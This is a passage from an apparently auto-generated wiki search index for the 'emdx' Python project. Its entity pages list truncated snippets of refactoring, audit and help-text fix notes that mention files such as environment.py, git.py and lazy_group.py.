\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>9.</code>emdx/ui/task_view.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>**kwargs: object</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>emdx/ui/log_browser_navigation.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>emdx/ui/log_browser_display.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/emdxutilsenvironmentpy/","title":"emdx/utils/environment.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-01-11</p>"},{"location":"entities/emdxutilsenvironmentpy/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...d as #(\\d+)<code>| |</code>emdx/utils/git_ops.py<code>| 60-65, 488 | \ud83d\udcdd\ud83d\udccb | Git status icons | |</code>emdx/utils/environment.py<code>| 186, 191 | \u274c\u2705 | Environment validation output | |</code>emdx/commands/core.py` | 169, 553, 796, 1008, 1082, 1165, 1195, 1198 | \u2705\ud83d\udd0d\u26a0\ufe0f | Save/search/edit/delete result me...</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: 7 conflicted files resolved:</p> <p>...unified_executor.py<code>| Kept main + removed remaining Cursor comment reference | |</code>emdx/utils/environment.py` | Kept main's version |</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/utils/retry.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 39, 56 <code>last_exception: BaseException \\| None = None</code> NECESSARY - Initialized before loop"},{"location":"entities/emdxutilsenvironmentpy/#22-emdxutilsenvironmentpy","title":"22. <code>emdx/utils/environment.py</code>","text":"<p>| ...</p> <ul> <li>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files <p>...ation for all constants</p> </li> <li><code>emdx/config/__init__.py</code> - Exports all new constants</li> <li><code>emdx/utils/environment.py</code> - Uses ENV_* and timeout constants</li> <li> <p><code>emdx/models/executions.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...in.py<code>| Use ENV_SAFE_MODE | |</code>emdx/commands/gist.py<code>| Use ENV_GITHUB_TOKEN | |</code>emdx/utils/environment.py<code>| Use ENV_ANTHROPIC_API_KEY, ENV_CURSOR_API_KEY | |</code>emdx/config/settings.py<code>| Use ENV_TEST_DB | |</code>emdx/database/connection.py<code>| Use ENV_TEST_DB | |</code>emdx/ui/mar...</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...UT_SECONDS</p> </li> <li><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li> <p><code>emdx/utils/environment.py</code> - Uses ENV_*, VERSION_CHECK_TIMEOUT_SECONDS, AUTH_CHECK_TIMEOUT_SECONDS</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <p>..._CHECK_TIMEOUT`</p> </li> <li><code>emdx/services/cli_executor/cursor.py</code> - Uses <code>CLI_*_TIMEOUT</code></li> <li> <p><code>emdx/utils/environment.py</code> - Uses <code>CLI_*_TIMEOUT</code></p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Blocker Found &amp; Fixed</p> <p>Fix: Added <code>get_subprocess_env()</code> utility in <code>emdx/utils/environment.py</code> that strips <code>CLAUDECODE</code> from the env before spawning. Applied to all 7 subprocess.Popen call sites across 4 files:</p> </li> <li> <p><code>unified_executor.py</code> (2 calls \u2014 the main dele...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...Other Modules COMPLETED \u2713\\n   - <code>emdx/main.py</code> \u2713\\n   - <code>emdx/ui/gui.py</code> \u2713\\n   - <code>emdx/utils/environment.py</code> \u2713\\n\\nNot Yet Completed:**\\n- <code>emdx/commands/analyze.py</code> - PENDING (still has <code>console = Console()</code>)\\n- <code>emdx/commands/executions.py</code> - PENDING (still has `console...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/utils/environment.py \u2014 Major cleanup</li> </ol> </li> <li>Removed \"Cursor\" from class docstring</li> <li>Removed <code>\"cursor\": \"cursor\"</code> from <code>CLI_COMMANDS</code> dict</li> <li>Removed Cursor version command branch...</li> </ul>"},{"location":"entities/emdxutilsenvironmentpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/config/settings.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>single source of truth</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>reduced duplication</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>process_terminate_timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/emdxutilsgitpy/","title":"emdx/utils/git.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxutilsgitpy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6510 None Type Analysis [7/7] <p><code>emdx/utils/structured_logger.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 39 <code>process_id: int \\| None = None</code> NECESSARY - Defaults to current PID 56, 106, 117-135 `context: dict[str, Any] ... <ul> <li>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Files Changed <ol> <li><code>emdx/utils/git.py</code>:</li> </ol> </li> <li>Added <code>slugify_for_branch()</code> function</li> <li>Added <code>generate_delegate_branch_name()</code> function</li> <li> <p>Updated <code>create_worktree()</code> to accept optional <code>task_title</code> parameter</p> </li> <li> <p>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: Testing</p> <ul> <li>Linting passes: <code>poetry run ruff check emdx/commands/delegate.py emdx/utils/git.py</code> \u2713</li> </ul> </li> <li>Imports work correctly: Both new functions can be imported \u2713</li> <li> <p>Code follows existing patterns in the codebase</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxutilsgitpy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Git Utils Consolidation Complete</p> <ul> <li>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY) </li> <li><code>emdx/utils/git.py</code> (129 lines)</li> <li> <p><code>emdx/utils/git_ops.py</code> (753 lines)</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <p>...lized constants)</p> </li> <li><code>emdx/commands/delegate.py</code> (use timeout/branch constants)</li> <li><code>emdx/utils/git.py</code> (add get_default_branch())</li> <li><code>emdx/commands/core.py</code> (use DEFAULT_EDITOR)</li> <li> <p><code>emdx/main.py</code> (use BOOL_TRUTHY_VALUES)</p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 5. INFO: Good Practices Observed**</p> </li> <li>Git operations use argument lists, not shell: <code>emdx/utils/git.py</code>, <code>emdx/utils/git_ops.py</code></li> <li>Claude CLI uses argument lists: <code>emdx/services/cli_executor/claude.py:41</code></li> <li> <p>Gist creation uses temp files safely: `emdx/commands/...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe1 MEDIUM: Missing Retry Logic for I/O Operations</p> <p>...y<code>| Multiple | Git operations (push, fetch, clone) | HIGH - Network failures | |</code>emdx/utils/git.py<code>| 26, 41, 56, 81, 94 | Git subprocess calls | HIGH - Network failures | |</code>emdx/commands/gist.py` | 37, 90, 129, 149, 155 | GitHub gist operations | HIGH - Network...</p> </li> </ul>"},{"location":"entities/emdxutilsgitpy/#task","title":"Task","text":"<p>Merged emdx/utils/git.py into emdx/utils/git_ops.py as requested in the architecture analysis.</p>"},{"location":"entities/emdxutilsgitpy/#files","title":"Files","text":""},{"location":"entities/emdxutilsgitpy/#subprocess-handling","title":"Subprocess Handling","text":""},{"location":"entities/emdxutilsgitpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/utils/git_ops.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>get_git_project()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>executive summary found</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>cleanup_worktree()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>create_worktree()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>emdx/ui/command_palette/palette_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>emdx/ui/modals.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> <li><code>emdx/ui/document_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> <li><code>immediate actions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>emdx/ui/cascade/cascade_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> </ul>"},{"location":"entities/emdxutilslazygrouppy/","title":"emdx/utils/lazy_group.py","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxutilslazygrouppy/#documents-15","title":"Documents (15)","text":"<ul> <li>#6857 Delegate: Add command aliases using Click's get_command() pattern. Two   Section: Summary </li> <li><code>AliasGroup</code> \u2014 <code>TyperGroup</code> subclass that resolves aliases in <code>get_command()</code> before falling back to <code>super()</code></li> <li> <p><code>make_alias_group()</code> \u2014 Factory that crea...</p> </li> <li> <p>#6839 Delegate: list</p> <p>Fix: </p> </li> <li>Added <code>import click</code></li> <li>Added a routing block at the top of the <code>delegate()</code> callback that checks if <code>tasks[0]</code> matches a registered subcommand name, and if so, manually invokes it via click's context machinery</li> <li> <p>Removed the <code>help=</code> parame...</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <ol> <li><code>emdx/utils/lazy_group.py</code> (lines 163-166): Added <code>format_help()</code> to <code>LazyCommand</code> so that <code>--help</code> renders the full help text from the loaded real command, not just the placeholder.</li> </ol> </li> <li> <p>#6835 Delegate: list   Section: Changes on disk (uncommitted)</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so <code>--help</code> properly delegates to the real loaded command instead of showing empty help</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p><code>emdx/utils/lazy_group.py</code> (1 change):</p> </li> <li> <p>Added <code>format_help()</code> to <code>LazyCommand</code> \u2014 delegates help formatting to the real loaded command, so <code>emdx delegate --help</code> properly shows the Commands section with all subcommands listed</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so that <code>emdx delegate --help</code> properly delegates to the real (loaded...</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> that delegates to the real loaded command, ensuring <code>emdx delegate --help</code> renders the full help text from the actual command rather than the lazy wrapper's stub.</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> </li> <li> <p>#6795 Delegate: --help [2/2]</p> <ul> <li>Commit: <code>81cce93</code> \u2014 <code>feat: improve delegate --help with rich markup and grouped panels (Issue #1149)</code></li> </ul> </li> <li>Files changed: <code>emdx/commands/delegate.py</code> (106 lines), <code>emdx/utils/lazy_group.py</code> (+5 lines)</li> <li> <p>Lint: All checks passed</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> override to <code>LazyCommand</code> so the Rich-formatted help renders correctly through the lazy proxy</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> </li> <li> <p>Added <code>format_help()</code> override to <code>LazyCommand</code> \u2014 delegates help formatting to the real command, so Rich panels and markup render correctly through the lazy loading proxy</p> </li> <li> <p>#6784 Delegate: --help [2/2]   Section: Changes Summary</p> </li> <li> <p>Added <code>format_help</code> delegation \u2014 <code>LazyCommand.format_help()</code> now delegates to the real command, enabling Rich-formatted help to render through the lazy proxy</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 5. Files to Monitor During Upgrade</p> </li> <li> <p><code>emdx/utils/lazy_group.py</code> - Custom <code>LazyTyperGroup</code> class</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...- <code>emdx/ui/document_browser.py</code> - Duplicates: <code>asyncio</code> (5x), <code>traceback</code> (3x)</p> </li> <li><code>emdx/utils/lazy_group.py</code> - Duplicates: <code>get_command</code></li> <li><code>emdx/commands/executions.py</code> - Duplicates: <code>psutil</code>, <code>ExecutionMonitor</code></li> <li> <p><code>emdx/commands/ask.py</code> - Duplicates: <code>AskService</code>, `Embeddi...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe1 MEDIUM: Missing Exception Chaining (raise from)</p> <p>...e-raise | | <code>emdx/prompts/__init__.py</code> | 11 | ValueError for missing template | | <code>emdx/utils/lazy_group.py</code> | 135 | ValueError for invalid command |</p> </li> </ul>"},{"location":"entities/emdxutilslazygrouppy/#key-components-added-to-emdxutilslazy_grouppy","title":"Key components added to <code>emdx/utils/lazy_group.py</code>:","text":""},{"location":"entities/emdxutilslazygrouppy/#2-emdxutilslazy_grouppy-help-delegation-for-lazy-loaded-commands","title":"2. <code>emdx/utils/lazy_group.py</code> \u2014 Help delegation for lazy-loaded commands","text":""},{"location":"entities/emdxutilslazygrouppy/#1-emdxutilslazy_grouppy-added-format_help-to-lazycommand","title":"1. <code>emdx/utils/lazy_group.py</code> \u2014 Added <code>format_help()</code> to <code>LazyCommand</code>","text":"<p>Previously, <code>LazyCommand</code> (a <code>click.MultiCommand</code>) didn't override <code>format_help()</code>, so when <code>--help</code> was invoked on a lazil...</p>"},{"location":"entities/emdxutilslazygrouppy/#emdxutilslazy_grouppy_1","title":"<code>emdx/utils/lazy_group.py</code>","text":""},{"location":"entities/emdxutilslazygrouppy/#emdxutilslazy_grouppy_2","title":"<code>emdx/utils/lazy_group.py</code>","text":""},{"location":"entities/emdxutilslazygrouppy/#critical-custom-typer-extensions","title":"Critical (custom Typer extensions):","text":""},{"location":"entities/emdxutilslazygrouppy/#related-entities","title":"Related Entities","text":"<ul> <li><code>typergroup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>typer.typer()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>get_command()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>`emdx/utils/lazy_group.py</code>:` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>click.multicommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>`emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>1.</code>emdx/commands/delegate.py<code>\u2014 subcommand routing fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>lazycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/emojialiasespy/","title":"emoji_aliases.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/emojialiasespy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/architecture.md</p> <p>29. STALE: <code>emoji_aliases.py</code> listed as \"tag utilities\" (line 103) The architecture doc lists <code>utils/emoji_aliases.py</code> but this file doesn't exist. Tags were converted from emoji to text (migration 42).</p> </li> <li> <p>#6614 Delegate: Update documentation to remove all references to emoji alias   Section: Changes Made</p> </li> <li>Changed <code>emoji_aliases.py</code> description from \"tag alias system\" to \"tag utilities\"</li> <li> <p>Changed \"Emoji tags \u2014 Space-efficient visual organization\" to \"Plain text tags \u2014 Simple, readable tag organization\"</p> </li> <li> <p>#6611 Emoji alias removal: synthesis   Section: Key Findings</p> <p>The emoji alias system (<code>emdx/utils/emoji_aliases.py</code>) is a pure indirection layer that converts text tags like <code>\"gameplan\"</code> to emoji like <code>\"\ud83c\udfaf\"</code> at storage time. The investigation confirms it can be cleanly removed.</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 1. <code>EMOJI_ALIASES</code> (dict constant)</p> File Line Usage <code>emdx/utils/emoji_aliases.py</code> 9 Definition: <code>EMOJI_ALIASES: dict[str, str] = { ... }</code> <code>emdx/utils/emoji_aliases.py</code> 118 Build <code>REVERSE_ALIASES</code> from <code>EMOJI_ALIASES</code> `emdx/uti... </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Executive Summary</p> <p>The emoji alias system (<code>emdx/utils/emoji_aliases.py</code>) converts text tags like <code>\"gameplan\"</code> to emoji like <code>\"\ud83c\udfaf\"</code> at storage time. Emojis are what get stored in the SQLite <code>tags</code> table. Removing this system means tag...</p> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> <p>...t utils/ | | <code>datetime_utils.py</code> | Datetime parsing | 138 | Well-scoped, good | | <code>emoji_aliases.py</code> | Tag emoji mappings | 296 | Well-scoped, good | | <code>environment.py</code> | Env validation | 296 | Good, but large class | | <code>file_size.py</code> | Size formatting | 47 | Good,...</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> </li> <li>Status: Actively used</li> <li>Imports at:</li> <li><code>emdx/models/tags.py:8</code></li> <li><code>tests/test_emoji_aliases.py:3</code></li> <li><code>emdx/commands/tags.py:27</code></li> <li><code>emdx/commands/core.py:38</code></li> <li>Notes: All major exports used</li> </ul>"},{"location":"entities/emojialiasespy/#docsarchitecturemd","title":"docs/architecture.md","text":""},{"location":"entities/emojialiasespy/#18-emoji_aliasespy","title":"18. <code>emoji_aliases.py</code>","text":""},{"location":"entities/emojialiasespy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emoji_aliases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>testsuggestaliases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tests/test_models_tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testreversealiases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testnormalizetagtoemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testistextalias</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testisemojitag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testgetcategoryemojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testgetaliasesforemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testexpandaliasstring</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/entityservicepy/","title":"entity_service.py","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-22</p>"},{"location":"entities/entityservicepy/#documents-9","title":"Documents (9)","text":"<ul> <li>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/architecture.md <p>...-99)** Missing from <code>services/</code> listing:</p> </li> <li><code>link_service.py</code> \u2014 document linking</li> <li><code>entity_service.py</code> \u2014 entity extraction</li> <li><code>wiki_clustering_service.py</code> \u2014 wiki topic clustering</li> <li><code>wiki_entity_service.py</code> \u2014 wiki entity indexing</li> <li> <p><code>wiki_privacy_service.py</code> \u2014 wiki priv...</p> </li> <li> <p>#6745 Wiki Generation Architecture Research [2/10]   Section: Integration Points</p> <p>...ce.py<code>,</code>compact.py<code>(cluster discovery),</code>wikify_service.py<code>(auto-linking), and</code>entity_service.py<code>(cross-references). The new</code>WikiSynthesisService` would extend the existing pattern with wiki-specific prompts and the outline phase....</p> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Phase 1: Core Entity Pages (MVP)</p> <p>...tity&gt;`</p> </li> <li>Snippet extraction function \u2014 <code>extract_snippet(content, entity)</code> in <code>entity_service.py</code></li> <li>Entity index command \u2014 <code>emdx wiki index</code> lists all page-worthy entities alphabetically</li> <li> <p>Entity page command \u2014 <code>emdx wiki &lt;entity&gt;</code> renders the full pag...</p> </li> <li> <p>#6723 Wiki Generation Architecture Research \u2014 Topic Clustering Algorithms   Section: Phase 1 (Implement Now)</p> <ol> <li>Build weighted adjacency matrix from entity co-occurrence:</li> </ol> </li> <li>Weight = IDF-weighted Jaccard similarity (reuse <code>entity_service.py</code> logic)</li> <li> <p>Filter: require 2+ shared entities, remove edges below 0.1 similarity</p> </li> <li> <p>#6722 Wiki Generation Architecture Research \u2014 Static Site Options   Section: Context</p> <p>...e:</p> </li> <li><code>wikify_service.py</code> \u2014 Layer 1: title-match wikification (regex, zero-cost)</li> <li><code>entity_service.py</code> \u2014 Layer 3: entity extraction + IDF-weighted cross-referencing</li> <li><code>document_links</code> table \u2014 bidirectional knowledge graph (source/target/score/method)</li> <li> <p>`document_enti...</p> </li> <li> <p>#6717 Wiki Generation Architecture Research [4/10]   Section: 3. Dependency Tracking \u2014 Entity-to-Article Mapping</p> <p>Scoring \u2014 reuse the IDF-Jaccard approach from <code>entity_service.py</code>:</p> </li> <li>High overlap (&gt;0.3 Jaccard): Add doc to article sources, mark stale</li> <li>Medium overlap (0.15-0.3): Flag for review, don't auto-add</li> <li> <p>Low overlap (&lt;0.15): Ignore</p> </li> <li> <p>#6696 Delegate: Research noise filtering strategies for entity-based documen [1/4]   Section: Problem Analysis</p> <p>The current <code>entity_service.py</code> extracts entities from 4 sources (headings, backtick terms, bold text, capitalized phrases) and cross-references them across 653 docs. Generic headings like \"summar...</p> </li> <li> <p>#6693 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: 1. Storage-time cap on entity links (highest impact, do first)</p> <p>Add <code>DEFAULT_MAX_ENTITY_LINKS = 20</code> to <code>entity_service.py</code>.</p> </li> <li> <p>#6691 Delegate: Research link scoring and ranking strategies for multi-metho [2/4]   Section: Current State Summary</p> <p>The entity_match problem is clear in the code (<code>entity_service.py:344-348</code>):</p> </li> </ul>"},{"location":"entities/entityservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>wikify_service.py</code> 